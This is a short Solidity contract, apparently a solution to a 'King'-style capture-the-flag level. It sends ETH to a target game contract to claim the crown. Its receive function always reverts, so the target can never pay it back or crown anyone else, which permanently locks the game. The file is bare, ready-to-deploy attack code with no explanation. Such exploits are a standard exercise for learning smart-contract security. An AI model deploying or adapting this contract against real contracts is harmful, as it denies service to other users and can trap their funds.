// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


contract KingForever {
    address owner;
    uint256 value;

    constructor() payable {
        owner = msg.sender;
        value = msg.value;
    }

    function overthrowKing(address payable _addr) external payable {
        (bool call_tx, ) = _addr.call{value: value}("");

        require(call_tx, "Error sending ETH!");
    }

    receive() external payable { 
        revert("Aahhhahaha You didn't say the magic word");
    }
}